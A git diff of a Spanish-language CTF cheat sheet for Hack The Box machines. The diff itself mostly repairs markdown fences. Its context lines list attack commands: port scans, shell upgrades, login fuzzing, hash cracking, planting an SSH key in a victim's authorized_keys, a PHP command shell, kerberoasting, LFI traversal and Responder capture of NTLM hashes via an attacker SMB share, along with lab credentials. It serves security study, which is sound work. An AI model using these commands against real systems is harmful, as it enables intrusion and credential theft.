@@ -6,7 +6,7 @@ nmap *10.129.196.97 -p 1-65535 -T4 -A -v   //// -T4(limite de tiempo) -A ( agres
 
 nmap -sS -sU -T4 -A -v 10.10.10.3 (puertos udp)
 
-
+```
 ### REVERSE SHELL
 ```
 
@@ -20,6 +20,7 @@ REVERSE SHELL MAS POTENTE (Se ejecuta una vez que están dentro de una reverse S
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")
 
+```
 ### MYSQL
 ```
 mysql -h IP -u root
@@ -27,8 +28,9 @@ Dentro de la revershell lanzamos mysql -u user -pPASSWD (sin espacio detras de l
 show databases;
 por ejemplo tenemos la databases de joomla ---> use joomla
 show tables;
-select * FROM users \G (por ejemplo la que encontramos es user) 
+select * FROM users \G (por ejemplo la que encontramos es user)
 
+```
 ### FTP
 ```
 ftp <IP>
@@ -40,7 +42,7 @@ ftp <IP>
 >bye #exit
 wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
 Tambien se puede descargar desde dentro de ftp con get filename
-
+```
 ### FFUF
 ```
 		-MC --> acepta cualquier codigo
@@ -54,10 +56,11 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.70/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
 ffuf -w /usr/share/seclists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
   -fs es para excluir sites que se repitan
-
+```
 ### BRUTE FORCE
 ```
- ##JOHN THE RIPPER
+``
+##JOHN THE RIPPER
  ``
 
 .\john.exe .\hashes.txt --mask=susan_nasus_?d?d?d?d?d?d?d?d?d --format=Raw-SHA256  --> --mask= si sabes algo en concreto de la password, en este caso sabes que empieza por susan_nasus y va del 1 al 1.000.000.000 de hay que sea ?d?d?d?d?d?d?d?d?d --format= añades el formato del hash esto lo buscas en -> https://hashcat.net/wiki/doku.php?id=example_hashes
@@ -73,7 +76,7 @@ H | 0123456789ABCDEF
 s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 a | ?l?u?d?s
 b | 0x00 - 0xff
-
+ ``
  ## HASHCAT
  ``
 
@@ -83,9 +86,10 @@ hashcat -a 3 -m 18200  abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74
 -a 3 = siempre a menos que quieras meter una rule que seria= -a 0
 
 hashcat -a 3 -m 18200 hashes.txt rockyou.txt
-
+```
 ### SSH-SCP
 ```
+ ``
  ##SSH
  ``
 conectar por SSH ---> user@IP ---> te pide la pass luego
@@ -94,7 +98,7 @@ echo "public key" > /home/susan/.ssh/authorized_keys  ---> mete tu keyn en el fi
 ssh -i  peterolord(nombre llave) susan@10.10.11.253   ---> conecta tu maquina con el servidor mediante ssh, si tuvieras la contraseña de susan seria ->>
 ssh -i susan susan@10.10.11.253 --> teniendo la key de susan 
 	nombrekey  user@IPMaquina	
-
+ ``
  ##SCP
  ``
 subir ficheros --> scp -i peterolord ./Downloads/linpeas.sh  susan@10.10.11.253:/tmp  --> (peterolord=mi key) /user@IP/direccion donde quieres subir el archivo 
@@ -104,7 +108,7 @@ Una vez que ya tienes el linpeas dentro de la maquina victima te vas a /tmp y ha
 Si es winpeas lo corres poniendo el nombre solo
 
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR = USER KEY
-
+```
 ### PHP SHELL
 ```
 
@@ -117,13 +121,13 @@ Al ver que funciona ya metes la shell de PHP ( ver PHP SHELL)
 Si por ejemplo has introducido el codigo php en una pagina que se llama index.php, buscas ---> dev.devvortex.htb/index.php?cmd=id
 te lo llevas al burpsuite y ya hay desde el repeater vas buscando con ls, etc
 
-
+```
 ### IMPACKET
 ```
 
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 
-
+```
 ### BLOODHOUND
 ```
 
@@ -146,12 +150,13 @@ bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10
 	loggin con usuario
 	smbclient --no-pass //IP/Folder   (se conecta a la carpeta)
 	smbclient -L -> lista carpetas compartidas
-
-###EVIL-WINRM 
+```
+### EVIL-WINRM 
 ```
 
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
+```
 ### NTLM
 ```
 
@@ -169,7 +174,8 @@ server.
 string. The value is then compared to the value received from the client. If the values match, the client
 is authenticated.
 
-###LFI ---> Local File Inclusion
+```
+### LFI ---> Local File Inclusion
 ``` 
 
 Por ejemplo en la maquina responder htb tenemos la pagina http://unika.htb/index.php?page=french.html que puede ser vulnerable a LFI
@@ -178,14 +184,14 @@ En un sistema windows vamos a probar si funciona e incluye files en el sistema c
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 Una vez que sabemos que es vulnerable siendo windows podemos seleccionar un protocolo como SMB, windows intentara autenticarse
 en nuestra maquina y nosotros capturaremos el NetNTLMv2 (New Technology Lan Manager) con la herramienta RESPONDER
-
-###RESPONDER ---> (capturar NTLM entre otros)
+```
+### RESPONDER ---> (capturar NTLM entre otros)
 ```
 
 Lo inicializamos --> sudo responder -I {network_interface} se ve con ifconfig
 Ahora le decimos al server que incluya un recurso de nuestro SMB server con -Z http://unika.htb/?page=//10.10.14.25/somefile
 con la ip de nuestra maquina atacante ( dara un error en la web pero en el responder tendremos  NetNTLMv del administrator)
-
+```
 ### XSS
 ```
 
